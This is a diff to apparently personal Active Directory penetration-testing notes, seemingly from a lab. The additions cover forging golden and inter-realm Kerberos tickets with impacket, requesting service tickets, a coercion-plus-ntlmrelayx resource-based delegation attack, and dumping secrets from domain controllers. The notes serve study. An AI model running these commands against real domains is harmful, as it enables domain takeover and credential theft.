@@ -96,7 +96,11 @@ Enter-PSSession {PSSession_ID_returned}
   - `Rubeus.exe triage` to list available tickets
 
 **Abusing Domain Trusts**
-- Golden ticket
+- Remember here that since we're using kerberos we have to use DNS instead of IPs
+- Gettind SIDs
+	- Domain SIDs are often needed for tickets, so we use impacket's `lookupsid.py`
+		- `lookupsid.py -domain-sids {domain_user_domain}/{domain_user}:{password}@{target_dc_IP} 0`
+- Golden ticket using child domain
   - If a parent domain trusts us as a child domain, we can use this to create a golden ticket with SIDs in the ticket's Privilege Attribute Certificate (PAC)
   - `ticketer.py` can use `krbtgt`'s nthash to create a golden ticket
     - `ticketer.py -nthash {child_krbtgt_nthash} -domain {child_domain} -domain-sid {child_domain_sid} -extra-sid {parent_domain_sid}-519 fakeuser`
@@ -104,10 +108,40 @@ Enter-PSSession {PSSession_ID_returned}
       - To use the ticket, we may need to save it with `export KRB5CCName={path_to_ticket}`, but I think impacket will recognize it in our directory for the specified user
     - We can then use the ticket to `secretsdump` or `psexec`
       - `secretsdump.py -k -no-pass {child_domain}/fakeuser@{parent_domain_machine_name}`
-- Forging inter-realm TGT
-  - We can also extract the trust key and use it to create our own trust ticket
-  - `ticketer.py -nthash {child_krbtgt_nthash} -domain {child_domain} -domain-sid {child_domain_sid} -extra-sid {parent_domain_sid}-519 -spn krbtgt/{parent_domain_name} fakeuser`
-    - This will again yield us a golden ticket, which we can use like before with `KRB5CCName` env var set to the path of the ticket
+	  - This works because we've forged a TGT that was valid for our child domain with the parent domain listed as an additional SID on the ticket, we can directly authenticate and access resources
+- Forging inter-realm TGT and getting a service ticket
+  - We can also extract the trust key and use it to create our own TGT
+  - `ticketer.py -nthash {DOMAIN$_NTLM_trust_hash} -domain {child_domain} -domain-sid {child_domain_sid} -extra-sid {parent_domain_sid}-519 -spn krbtgt/{parent_domain_name} fakeuser`
+	- The domain NTLM trust hash will look like `SEVENKINGDOMS$:1104:{hash}:::`
+	- Then, export the ticket to be used for kerberos auth with `export KRB5CCName={path_to_ticket}`
+  - We can then use this TGT to request a service ticket using `getST.py`
+	- `getST.py -k -no-pass -spn {spn}/{parent_domain_computer_name} '{parent_domain}/fakeuser@{parent_domain}' -debug`
+		- The spn value can be many different things, depending on what service we'd like to request:
+			- HOST for general host access, CIFS for SMB, LDAP for ldap, GC for Global Catalog, RPCSS for  RPC, MSSQLSvc for MSSQL, HTTP for web, WSMAN for PowerShell remoting
+	- Since this is an interrealm service-key, it doesn't provide access to services yet, so we can use it to request one of the above services from the DC
+  - We then export this new ST, and we can use it to authenticate directly to the parent domain controller
+	- `secretsdump.py -k -no-pass fakeuser@kingslanding.sevenkingdoms.local`
+	  - This would require a `cifs/` service ticket, as dumping secrets is done through SMB
+
+## Delegation
+- Resource-based Constrained Delegation (RBCD) is basically allowing one entity to perform some action on behalf of another user
+- It's very useful for giving granular permissions, for example if a service user needs to access only some resources on behalf of another user
+- Alice delegating to Bob means that Bob can request Kerberos tickets and access services on behalf of Alice
+
+**Abusing Delegation to a Machine We Control**
+- `ntlmrelayx` supports providing delegation to our owned computer accounts with `--delegate-access`
+  - This means that the target computer will delegate to our newly-created computer
+- An example attack path:
+  - Coerce a computer to authenticate to us (or gather relayable credentials in some manner): 
+    - `coercer coerce -l {our_IP} -t {target_IP} --always-continue -u {username} -p {password}`
+  - Set up `ntlmrelayx` to add a computer to the domain using the relayed credentials which the coerced machine has delegation rights over:
+    - `ntlmrelayx.py -t ldaps://{dc_IP} -smb2support --remove-mic --add-computer {new_computer_name} --delegate-access`
+  - Use new computer to request a TGS from the machine's Administrator via our new delegation 
+    - `getST.py -spn HOST/{target_machine_name}.{domain} -impersonate Administrator -dc-ip {dc_ip} '{domain}/{new_computer_name}:{new_computer_pass}'`
+  - Use the valid TGS to extract secrets from the target machine:
+    - `export KRB5CCNAME=./Administrator.ccache; secretsdump.py -k -no-pass {domain}/Administrator@{target_ip}`
+
+## Credential Harvesting
 
 **Getting More Credentials**
 - `vault::cred /patch` will enumerate vault credentials (creds used in scheduled tasks)
